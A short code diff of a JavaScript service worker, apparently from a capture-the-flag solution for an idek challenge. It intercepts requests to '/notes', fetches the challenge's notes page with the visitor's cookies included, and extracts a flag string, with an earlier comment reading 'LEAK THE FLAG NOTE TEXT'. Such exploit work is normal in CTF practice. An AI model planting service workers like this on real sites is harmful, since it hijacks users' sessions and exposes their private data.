@@ -1,15 +1,14 @@
 self.addEventListener("fetch", (event) => {
   const url = new URL(event.request.url);
 
-  if (url.pathname === "/proxy/notes") {
+  if (url.pathname === "/notes") {
     event.respondWith(
       (async () => {
         const response = await fetch("https://fnotes-web.ctf-chal.idek.team/notes/", {
-          credentials: "include", // ensure cookies/session go through
+          credentials: "include"
         });
         const text = await response.text();
 
-        // LEAK THE FLAG NOTE TEXT
         const match = text.match(/idek{.*?}/);
         if (match) {
           console.log("[FLAG]", match[0]);
